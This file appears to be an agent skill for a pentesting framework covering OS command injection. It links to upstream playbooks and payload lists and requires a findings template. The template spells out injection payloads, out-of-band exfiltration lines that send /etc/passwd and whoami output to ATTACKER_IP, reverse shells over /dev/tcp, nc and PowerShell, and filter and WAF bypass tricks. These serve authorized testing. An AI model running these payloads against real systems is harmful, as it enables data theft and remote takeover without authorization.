---
name: s-command-injection
description: Unified Command Injection skill linking hack-skills methodology with AboutSecurity execution resources.
---

# Unified Command Injection

## When To Use

Use for OS command injection analysis, shell metacharacter testing and safe verification.

## Source Priority

| Task Type | Primary Source |
|---|---|
| Methodology | hack-skills |
| Execution | AboutSecurity |
| Ctf | AboutSecurity |
| Bug Bounty | hack-skills |
| Resources | AboutSecurity |

## Source Strategy

- Use hack-skills for methodology, scenario classification, domain coverage and deeper playbooks.
- Use AboutSecurity for execution constraints, mandatory rules, payload files, dictionaries, tool YAML configs, CTF and K8s fine-grained resources.
- Do not duplicate upstream content here. Load upstream files when needed.

## Recommended Loading Order

### High-Level Analysis

1. Read matched hack-skills files first unless Source Priority says otherwise.
2. Then read matched AboutSecurity files for constraints and execution details.

### Execution

1. Read matched AboutSecurity skill files first.
2. Check related Tools YAML.
3. Check related Payload/Dic/Doc files.
4. Fall back to hack-skills for scenario variants and methodology.

### CTF

1. Prefer AboutSecurity when this topic has matching AboutSecurity skills/resources.
2. Use hack-skills for broader theory or missing coverage.

### Bug Bounty / Authorized Assessment

1. Prefer hack-skills methodology and scenario files.
2. Use AboutSecurity tools/resources for execution support.

## Conflict Resolution

1. Safety and authorization rules always have highest priority.
2. AboutSecurity `NEVER`, `ALWAYS`, `禁止`, `必须`, `⛔` rules override general methodology during execution.
3. hack-skills is preferred for scenario classification, knowledge depth and real-world methodology.
4. AboutSecurity is preferred for tools, payloads, dictionaries, CTF and automated execution constraints.
5. For CTF tasks, prefer AboutSecurity unless this topic is mainly covered by hack-skills.
6. For bug bounty or authorized assessment, prefer hack-skills for strategy and AboutSecurity for resources.

## Matched hack-skills Skills

- `../../security-sources/hack-skills/skills/path-traversal-lfi/SKILL.md` — SKILL: Path Traversal / Local File Inclusion (LFI) — Expert Attack Playbook
- `../../security-sources/hack-skills/skills/ssti-server-side-template-injection/SKILL.md` — SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook
- `../../security-sources/hack-skills/skills/expression-language-injection/SKILL.md` — SKILL: Expression Language Injection — Expert Attack Playbook
- `../../security-sources/hack-skills/skills/unauthorized-access-common-services/SKILL.md` — SKILL: Unauthorized Access to Common Services — Expert Attack Playbook
- `../../security-sources/hack-skills/skills/insecure-source-code-management/SKILL.md` — SKILL: Insecure Source Code Management

## Matched AboutSecurity Skills

- `../../security-sources/AboutSecurity/skills/exploit/web-method/command-injection-methodology/SKILL.md` — 命令注入完整方法论
- `../../security-sources/AboutSecurity/skills/exploit/web-method/prototype-pollution-exploit/SKILL.md` — JavaScript 原型链污染漏洞利用
- `../../security-sources/AboutSecurity/skills/exploit/web-method/expression-language-injection/SKILL.md` — 表达式语言(EL)注入方法论
- `../../security-sources/AboutSecurity/skills/ctf/ctf-source-audit/SKILL.md` — CTF 源码审计方法论
- `../../security-sources/AboutSecurity/skills/exploit/network-service/postgresql-pentesting/SKILL.md` — PostgreSQL 渗透测试方法论 (5432)

## Related AboutSecurity Tools

- No match found.

## Related AboutSecurity Payloads

- `../../security-sources/AboutSecurity/Payload/rce/php.txt`
- `../../security-sources/AboutSecurity/Payload/rce/rce.txt`
- `../../security-sources/AboutSecurity/Payload/rce/java.txt`
- `../../security-sources/AboutSecurity/Payload/rce/unix.txt`
- `../../security-sources/AboutSecurity/Payload/rce/_meta.yaml`
- `../../security-sources/AboutSecurity/Payload/rce/windows.txt`
- `../../security-sources/AboutSecurity/Payload/rce/powershell.txt`

## Related AboutSecurity Dictionaries

- `../../security-sources/AboutSecurity/Dic/web/api-param/param-rce.txt`

## Related AboutSecurity Docs

- No match found.

## References

See `references/SOURCES.md`.

## Vulnerability Testing Output Template

When you discover a potential Command Injection vulnerability and begin active testing, ⛔ **MUST** structure findings using this fixed 4-module output template. This applies regardless of which upstream methodology you use.

### Module 1: 测试思路 (Testing Approach)
- Describe the injection context: ping/traceroute utility, file compression, image processing (ImageMagick), PDF generator, or system statistics endpoint
- Classify the injection type: direct command execution, argument injection, or shell metacharacter injection
- State the OS fingerprint evidence: Windows vs. Linux command behavior, path separator, `cmd.exe /c` vs. `/bin/sh -c`
- Document the decision tree: parameter identified → basic metacharacter test (`;` `|` `&` `\n`) → command separator identified → blind vs. visible output → output channel selection → OOB if blind
- State expected success indicator: command output in response, time delay, DNS/HTTP callback, file creation

### Module 0: 防护探测 filter_probe（⛔ 必须先于 payload）

探测命令分隔符：`;` `|` `||` `&&` `$()` `` ` `` `%0a` `%0d`。每个单独测试，记入 filter_probe。

> 编号化测试要点见 `../pentest-windftsy/references/test-checkpoints.md` — **CMDI001~003**。
> ⛔ 无回显必须做带外/时延验证。⛔ 遇过滤至少尝试3种绕过（命令替换/IFS空格/引号拼接/编码）。

### Module 2: 关键技巧 (Key Techniques)
- List 2-4 non-obvious technical details:
  - Command chaining alternatives: `%0a` (newline), `` ` `` (backtick substitution), `$(cmd)` (command substitution) — these work when `;` or `|` are filtered
  - Blind injection detection: `sleep 5` (time-based), `curl http://attacker.com/?r=$(whoami)` (OOB), `touch /tmp/pwned` + check via LFI (file-based)
  - Argument injection: when only arguments are controllable (e.g., `ping -c 1 USER_INPUT`), use `-c 1 ; cmd` or `-c 1 $(cmd)`
  - Whitespace bypass: `${IFS}` (Bash internal field separator), `$IFS$9`, `<` (input redirection as separator), `{cmd,args}` (brace expansion)

### Module 3: Payload字典 (Payload Dictionary)
- ⛔ Provide minimum 3 payloads organized by target OS:
  1. **Linux detection**: `; id`, `| whoami`, `` `id` ``, `$(uname -a)`, `%0a id` (newline injection)
  2. **Windows detection**: `& whoami`, `| ver`, `&& systeminfo`, `%0d%0a whoami` (CRLF)
  3. **Blind / OOB exfiltration**: `` `curl http://ATTACKER_IP/$(cat /etc/passwd|base64)` ``, `; nslookup $(whoami).ATTACKER_DOMAIN`, `| wget http://ATTACKER_IP/$(id)`
  4. **Reverse shell** (if authorized): `bash -i >& /dev/tcp/IP/PORT 0>&1`, `nc -e /bin/sh IP PORT`, `powershell -e BASE64_PAYLOAD`
- Each entry format: `[OS / Injection Type] <payload>` → expected behavior
- Source payloads from upstream `AboutSecurity/Payload/rce/` files when applicable

### Module 4: 绕过方法 (Bypass Methods)
- Anticipate defensive measures and provide counter-strategies:
  1. **Input validation bypass**: encoding (URL, Base64, hex), case mutation (`WhOaMi`), wildcard expansion (`/???/??t /??c/p??swd`), concatenation (`c''at`, `c""at`, `c\at`)
  2. **Command blacklist bypass**: alternative binaries (`wget` → `curl`, `cat` → `tac`/`head`/`tail`/`more`/`less`/`nl`), busybox multiplexing, `/bin/base64 /etc/passwd | base64 -d`
  3. **Shell metacharacter filter bypass**: `${IFS}` for space, newline `%0a` for `;`, backtick for `$()`, here-string `<<<` for pipe
  4. **WAF bypass**: multipart form data, chunked encoding, parameter pollution, HTTP method switching (GET → POST → PUT)

## Important Agent Rules

- Do not treat this bridge file as the full knowledge source.
- Always load the matched upstream files needed for the task.
- Preserve and obey upstream mandatory execution rules.
- Avoid unnecessary brute force or destructive testing.
- Only operate in authorized environments.
